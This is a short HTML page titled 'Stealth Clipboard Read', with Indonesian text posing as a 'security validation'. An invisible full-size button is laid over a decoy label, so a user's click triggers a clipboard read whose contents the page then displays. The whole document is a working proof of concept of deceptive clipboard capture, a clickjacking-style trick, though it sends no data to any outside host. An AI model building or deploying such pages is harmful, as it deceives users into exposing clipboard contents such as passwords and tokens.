<!DOCTYPE html>
<html>
<head>
  <title>Stealth Clipboard Read</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }

    #fakeLabel {
      background-color: #007bff;
      color: white;
      padding: 12px 24px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 18px;
      display: inline-block;
    }

    #realButton {
      position: absolute;
      top: 0;
      left: 0;
      opacity: 0;
      z-index: 10;
      width: 100%;
      height: 100%;
      cursor: pointer;
    }

    #container {
      position: relative;
      display: inline-block;
    }

    #result {
      margin-top: 30px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h2>Validasi Keamanan</h2>
  <p>Klik tombol untuk validasi (clipboard akan dicek)</p>

  <div id="container">
    <div id="fakeLabel">Klik untuk Lanjut</div>
    <button id="realButton" onclick="readClipboard()"></button>
  </div>

  <div id="result"></div>

  <script>
    function readClipboard() {
      if (!document.hasFocus()) {
        document.getElementById("result").innerText = "‚ùå Tab tidak fokus. Coba klik lagi.";
        return;
      }

      navigator.permissions.query({ name: "clipboard-read" }).then(function (permission) {
        if (permission.state === "granted" || permission.state === "prompt") {
          navigator.clipboard.readText().then(function (text) {
            document.getElementById("result").innerText = "üìã Clipboard berisi:\n" + text;
          }).catch(function (err) {
            document.getElementById("result").innerText = "‚ùå Gagal membaca clipboard: " + err;
          });
        } else {
          document.getElementById("result").innerText = "‚ùå Izin clipboard ditolak oleh browser.";
        }
      });
    }
  </script>
</body>
</html>
